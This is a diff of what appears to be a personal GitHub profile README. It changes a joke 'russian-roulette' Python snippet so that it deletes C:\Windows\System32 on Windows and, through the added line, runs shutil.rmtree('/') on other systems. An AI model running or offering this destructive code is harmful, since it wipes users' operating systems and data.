@@ -1,4 +1,4 @@
-### a9fm@debian:~$ cat /home/a9fm/A9FM.md
+### a9fm@debian:~$ cat /home/russian-roulette.py
 >```
 > import os
 > import random
@@ -7,10 +7,8 @@
 >    if os.name == 'nt':
 >        shutil.rmtree("C:\Windows\System32")
 >    else:
->        print("Not bad, don't use Windows PLZ")
+>        shutil.rmtree("/")
 > ```
-I know Python, HTML (MD) 🐍
-Learn CSS, JS, Java, C++/C# 😈👨🏿‍💻
 
 ### Profile Viewers
 <img align="center" src="https://profile-counter.glitch.me/{a9fm}/count.svg"/></p> 
